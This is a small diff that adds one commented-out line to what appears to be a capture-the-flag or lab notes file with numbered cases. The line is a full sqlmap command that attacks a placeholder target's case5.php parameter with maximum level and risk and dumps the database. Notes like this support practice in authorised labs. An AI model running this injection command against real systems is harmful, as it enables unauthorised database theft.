@@ -46,6 +46,8 @@
 #
 ###case 5
 #
+#sqlmap -u "http://TGTHOST/case5.php?id=*" --dump --batch -t flag5 --no-cast --random-agent --level 5 --risk 3 --technique=BEU --dbms=MySQL --method=GET
+#
 ###case 6
 #
 ###case 7
